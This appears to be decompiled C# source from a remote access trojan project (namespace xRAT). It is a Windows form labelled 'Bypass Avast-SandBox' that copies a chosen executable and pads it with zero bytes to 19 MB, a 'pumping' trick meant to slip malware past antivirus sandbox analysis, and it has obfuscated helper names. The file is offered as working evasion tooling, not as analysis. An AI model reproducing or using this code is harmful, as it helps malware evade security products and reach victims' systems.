namespace xRAT
{
    using Microsoft.VisualBasic;
    using Microsoft.VisualBasic.CompilerServices;
    using System;
    using System.ComponentModel;
    using System.Diagnostics;
    using System.Drawing;
    using System.IO;
    using System.Runtime.CompilerServices;
    using System.Windows.Forms;

    [DesignerGenerated]
    public class Avast : Form
    {
        [AccessedThroughProperty("Button1")]
        private Button _Button1;
        [AccessedThroughProperty("Button2")]
        private Button _Button2;
        [AccessedThroughProperty("PictureBox1")]
        private PictureBox _PictureBox1;
        [AccessedThroughProperty("TextBox1")]
        private TextBox _TextBox1;
        private IContainer icontainer_0;

        public Avast()
        {
            Class1.QaIGh5M7cuigS();
            this.InitializeComponent();
        }

        private void Button1_Click(object sender, EventArgs e)
        {
            SaveFileDialog dialog = new SaveFileDialog {
                Filter = "Exe Files|*.exe"
            };
            dialog.ShowDialog();
            double num = Conversions.ToDouble("19");
            File.Copy(this.TextBox1.Text, dialog.FileName);
            num *= 1048576.0;
            FileStream stream = File.OpenWrite(dialog.FileName);
            for (long i = stream.Seek(0L, SeekOrigin.End); i < num; i += 1L)
            {
                stream.WriteByte(0);
            }
            stream.Close();
            Interaction.MsgBox("Successfully Pumped!", MsgBoxStyle.OkOnly, null);
        }

        private void Button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog dialog = new OpenFileDialog {
                Filter = "Exe Files|*.exe"
            };
            dialog.ShowDialog();
            this.TextBox1.Text = dialog.FileName;
        }

        [DebuggerNonUserCode]
        protected override void Dispose(bool disposing)
        {
            try
            {
                if (disposing && (this.icontainer_0 != null))
                {
                    this.icontainer_0.Dispose();
                }
            }
            finally
            {
                base.Dispose(disposing);
            }
        }

        [DebuggerStepThrough]
        private void InitializeComponent()
        {
            ComponentResourceManager manager = new ComponentResourceManager(typeof(Avast));
            this.PictureBox1 = new PictureBox();
            this.Button1 = new Button();
            this.TextBox1 = new TextBox();
            this.Button2 = new Button();
            ((ISupportInitialize) this.PictureBox1).BeginInit();
            this.SuspendLayout();
            this.PictureBox1.Image = Class5.smethod_43();
            Point point = new Point(0x15, 12);
            this.PictureBox1.Location = point;
            this.PictureBox1.Name = "PictureBox1";
            Size size = new Size(50, 50);
            this.PictureBox1.Size = size;
            this.PictureBox1.TabIndex = 0;
            this.PictureBox1.TabStop = false;
            point = new Point(12, 0x44);
            this.Button1.Location = point;
            this.Button1.Name = "Button1";
            size = new Size(0x10c, 50);
            this.Button1.Size = size;
            this.Button1.TabIndex = 1;
            this.Button1.Text = ":: Bypass Avast-SandBox ::";
            this.Button1.UseVisualStyleBackColor = true;
            point = new Point(0x51, 12);
            this.TextBox1.Location = point;
            this.TextBox1.Name = "TextBox1";
            size = new Size(0xc7, 0x15);
            this.TextBox1.Size = size;
            this.TextBox1.TabIndex = 3;
            point = new Point(0x51, 0x27);
            this.Button2.Location = point;
            this.Button2.Name = "Button2";
            size = new Size(0xc7, 0x17);
            this.Button2.Size = size;
            this.Button2.TabIndex = 4;
            this.Button2.Text = "...";
            this.Button2.UseVisualStyleBackColor = true;
            SizeF ef = new SizeF(6f, 13f);
            this.AutoScaleDimensions = ef;
            this.AutoScaleMode = AutoScaleMode.Font;
            size = new Size(0x129, 0x81);
            this.ClientSize = size;
            this.Controls.Add(this.Button2);
            this.Controls.Add(this.TextBox1);
            this.Controls.Add(this.Button1);
            this.Controls.Add(this.PictureBox1);
            this.FormBorderStyle = FormBorderStyle.FixedSingle;
            this.Icon = (Icon) manager.GetObject("$this.Icon");
            this.Name = "Avast";
            this.Text = " Bypass Avast-SandBox";
            ((ISupportInitialize) this.PictureBox1).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();
        }

        internal virtual Button Button1
        {
            get
            {
                return this._Button1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Button1_Click);
                if (this._Button1 != null)
                {
                    this._Button1.Click -= handler;
                }
                this._Button1 = value;
                if (this._Button1 != null)
                {
                    this._Button1.Click += handler;
                }
            }
        }

        internal virtual Button Button2
        {
            get
            {
                return this._Button2;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                EventHandler handler = new EventHandler(this.Button2_Click);
                if (this._Button2 != null)
                {
                    this._Button2.Click -= handler;
                }
                this._Button2 = value;
                if (this._Button2 != null)
                {
                    this._Button2.Click += handler;
                }
            }
        }

        internal virtual PictureBox PictureBox1
        {
            get
            {
                return this._PictureBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._PictureBox1 = value;
            }
        }

        internal virtual TextBox TextBox1
        {
            get
            {
                return this._TextBox1;
            }
            [MethodImpl(MethodImplOptions.Synchronized)]
            set
            {
                this._TextBox1 = value;
            }
        }
    }
}

